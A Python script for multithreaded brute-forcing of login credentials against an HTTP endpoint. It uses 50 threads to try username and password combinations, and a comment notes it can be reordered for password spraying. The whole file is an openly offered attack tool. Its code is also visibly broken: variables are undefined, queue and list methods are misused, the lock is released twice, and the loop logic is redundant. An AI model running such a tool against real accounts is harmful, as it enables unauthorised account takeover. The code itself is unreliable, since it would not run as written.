import queue
import threading
from itertools import product
import HTTP  # Assuming HTTP is a module with the make_request function

lock = threading.Lock()
# Event to signal when valid credentials are found
found_event = threading.Event()

users:queue.Queue = queue.Queue()
passwords = []
    #global index to see how many tries have been made
index:int = 0

def getPass():
    user = None
    password = None
    if (passIndex >= passwords.count() or users.Count == 0):
        user= None
        password = None
        return user, password
    
    password = users[passIndex]
    passIndex += 1
    #the last one
    if (passIndex == passwords.count()):
    
        passIndex = 0
        user=users.pop()
    else:
        user = users.pop()
        users.put(user)
    return user, password

#could be used if there's an error with the actual user
def tryNextUser():
    passIndex = passwords.count()-1

# Worker function to process the tasks
def worker(users, passwords):
    while(found_event.is_set() == False):
        try:
            lock.acquire()
            user, password = getPass()
            lock.release()
        except queue.Empty:
            break
        finally:
            lock.release()

        if HTTP.make_request(user, password):  # Assuming this function returns True on success
            found_event.set()
            break
        index = index + 1
   
   
    for user, password in product(users, passwords):
        if found_event.is_set():
            break
        if HTTP.make_request(user, password):  # Assuming this function returns True on success
            found_event.set()
            break

# Main function to manage threads
def brute_force(u, p):
    
    index = 0
    users = queue.Queue()
    for user in u:
        users.put(user)
    passwords = p
    threads = []

    for _ in range(50):  # Adjust the number of threads as needed
        thread = threading.Thread(target=worker, args=(users, passwords))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    return found_event.is_set()

# Example usage
if __name__ == "__main__":
    users = ["user1", "user2", "user3"]  # Add more users as needed
    passwords = ["pass1", "pass2", "pass3"]  # Add more passwords as needed
    #to password spray, send the parameters in the opposite order
    success = brute_force(users, passwords)
    if success:
        print("Valid credentials found!")
    else:
        print("No valid credentials found.")